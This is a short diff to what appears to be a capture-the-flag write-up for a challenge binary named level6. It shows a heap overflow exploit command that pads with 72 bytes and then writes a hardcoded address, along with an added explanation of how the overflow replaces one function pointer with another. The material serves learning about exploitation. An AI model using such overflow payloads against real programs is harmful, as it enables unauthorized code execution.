@@ -34,4 +34,6 @@ lets print them :
 
 easy exploit for us now : 
 
-./level6  $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"') :)
+./level6  $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+
+Since the 2 values are malloced one after the other, if we write inside f we will overwrite m address with n address :)
